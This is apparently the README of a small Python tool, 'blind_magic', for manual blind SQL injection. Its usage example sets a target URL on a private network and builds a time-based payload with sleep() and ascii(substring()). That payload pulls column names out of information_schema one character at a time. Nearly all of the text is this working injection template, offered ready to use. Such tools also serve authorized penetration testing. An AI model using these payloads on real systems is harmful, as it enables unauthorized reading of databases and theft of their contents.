# blind_magic 0.1.2  
Manual Blind SQL Injection  
  
Some trick:  
I supply to you 5 loop variables l1 to l5 {l1} {l2} {l3} {l4} {l5}  
  
Blind query statament:  
{CONDITION_QUERY}  
{QUERY}  
{OPERATOR}  
{CHAR}  
  
example:  
b = Blind_magic()
b.l(1,0,0,0,0,10,3,0,0,0)  
b.url = "http://10.0.42.224/?q="  
b.base_query = "if(({CONDITION_QUERY}),sleep(1),NULL)"  
b.condition_query = "ascii(substring(({QUERY}),{l1},1)){OPERATOR}{CHAR}"  
b.query = "Select column_name from information_schema.columns where table_name='staffs' limit {l2},1"  
b.run()  
print b.result   
